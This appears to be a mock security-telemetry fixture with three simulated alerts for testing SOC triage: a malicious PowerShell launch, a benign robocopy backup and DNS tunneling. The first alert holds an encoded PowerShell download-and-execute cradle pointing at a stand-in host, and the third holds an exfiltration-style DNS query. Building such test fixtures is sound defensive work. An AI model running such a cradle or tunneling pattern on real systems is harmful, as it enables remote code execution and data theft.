# mock_telemetry.py

MOCK_ALERTS = {
    "ALERT-001-TP": {
        "alert_id": "SEC-EDR-89211",
        "timestamp": "2026-09-25T14:32:10Z",
        "source": "CrowdStrike Falcon (Simulated)",
        "severity": "High",
        "event_type": "Suspicious Process Execution",
        "endpoint": {
            "hostname": "FIN-SRV-04.corp.local",
            "ip_address": "10.0.4.15",
            "os": "Windows Server 2022",
            "criticality": "Tier-1 Mission Critical"
        },
        "telemetry_data": {
            "process_name": "powershell.exe",
            "parent_process": "cmd.exe",
            "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQBbAC4AXQBjAG8AbQAvAHIAZQBxAC4AcABzADEAJwApAA==",
            "destination_ip": "198.51.100.24",
            "destination_domain": "malicious-beacon-example[.]com",
            "file_hash_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        }
    },
    
    "ALERT-002-FP": {
        "alert_id": "SEC-CLM-44021",
        "timestamp": "2026-09-25T15:10:04Z",
        "source": "Splunk Core Triage",
        "severity": "Medium",
        "event_type": "Privilege Escalation / Admin Backup Utility",
        "endpoint": {
            "hostname": "IT-ADM-W10.corp.local",
            "ip_address": "10.0.12.88",
            "os": "Windows 11 Enterprise",
            "criticality": "Tier-3 Standard"
        },
        "telemetry_data": {
            "process_name": "robocopy.exe",
            "parent_process": "TaskScheduler.exe",
            "command_line": "robocopy C:\\Users\\Admin\\AppData\\Local\\Temp \\\\BackupNAS\\Share\\ /MIR /R:2 /W:5",
            "destination_ip": "10.0.99.10",
            "destination_domain": "backupnas.corp.local",
            "file_hash_sha256": "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824"
        }
    },

    "ALERT-003-DNS": {
        "alert_id": "SEC-DDI-78190",
        "timestamp": "2026-09-25T16:05:44Z",
        "source": "BlueCat DDI DNS Firewall (Simulated)",
        "severity": "Critical",
        "event_type": "DNS Tunneling / Data Exfiltration",
        "endpoint": {
            "hostname": "HR-PAYROLL-01.corp.local",
            "ip_address": "10.0.8.4",
            "os": "Ubuntu 22.04 LTS",
            "criticality": "Tier-1 Confidential"
        },
        "telemetry_data": {
            "query_type": "TXT",
            "suspicious_query": "dGhpcy1pcy1hbi1leGZpbHRyYXRpb24tdGVzdC1zdHJpbmc.tunnel.exfil-domain-test[.]net",
            "query_frequency": "120 queries/minute",
            "resolved_dns_server": "10.0.0.2",
            "reputation_flag": "High Entropy Subdomain Pattern"
        }
    }
}